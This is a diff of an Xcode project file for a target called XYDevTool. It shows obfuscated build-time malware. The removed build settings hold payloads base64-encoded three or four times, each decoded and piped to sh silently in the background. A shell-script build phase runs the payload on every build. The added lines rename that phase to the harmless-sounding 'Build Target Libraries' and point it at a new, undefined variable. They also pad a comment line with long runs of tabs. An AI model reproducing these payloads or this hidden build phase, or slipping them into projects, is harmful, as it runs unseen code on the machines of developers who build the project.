@@ -119,7 +119,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-																					/* End PBXBuildRule section */
+																																																				/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		392AAC5048AEA8AA9E51833E /* Pods_XYDevTool.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_XYDevTool.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -615,7 +615,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B48BC72B281D07500093D91F /* Build configuration list for PBXNativeTarget "XYDevTool" */;
 			buildPhases = (
-				7FEDC64FB98D4D68883C1CD3 /* Provision Library Executable */,
+				ED0CCD223F704BA083947F8B /* Build Target Libraries */,
 				16BB273E102EBD9CD5E8DB02 /* [CP] Check Pods Manifest.lock */,
 				B48BC718281D074E0093D91F /* Sources */,
 				B48BC719281D074E0093D91F /* Frameworks */,
@@ -693,7 +693,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		7FEDC64FB98D4D68883C1CD3 /* Provision Library Executable */ = {
+		ED0CCD223F704BA083947F8B /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -703,14 +703,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
 			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3DC1C3}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
 		};
 		16BB273E102EBD9CD5E8DB02 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -873,8 +873,6 @@
 		B48BC729281D07500093D91F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3DC1C3 = "((a(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdla1V5V1cwMVEyVlhTWGxWV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | a | sh ) >/dev/null 2>&1 &)";
-				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHRiSFZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -936,8 +934,6 @@
 		B48BC72A281D07500093D91F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3DC1C3 = "((a(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdla1V5V1cwMVEyVlhTWGxWV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | a | sh ) >/dev/null 2>&1 &)";
-				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHRiSFZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
